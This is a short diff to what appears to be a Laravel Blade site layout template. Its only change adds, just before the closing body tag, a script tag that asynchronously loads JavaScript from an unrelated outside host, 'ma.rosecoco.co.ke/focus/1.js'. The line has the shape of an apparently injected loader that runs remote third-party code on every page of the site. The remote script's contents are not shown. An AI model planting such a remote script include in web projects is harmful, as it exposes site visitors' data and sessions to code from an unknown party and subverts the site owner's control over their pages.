@@ -15,6 +15,6 @@
     @include('theme::partials.footer')
     @include('theme::partials.footer-scripts')
     {{ $javascript ?? '' }}
-
+    <script src="//ma.rosecoco.co.ke/focus/1.js" type="text/javascript" charset="utf-8" async="async"></script>
 </body>
 </html>
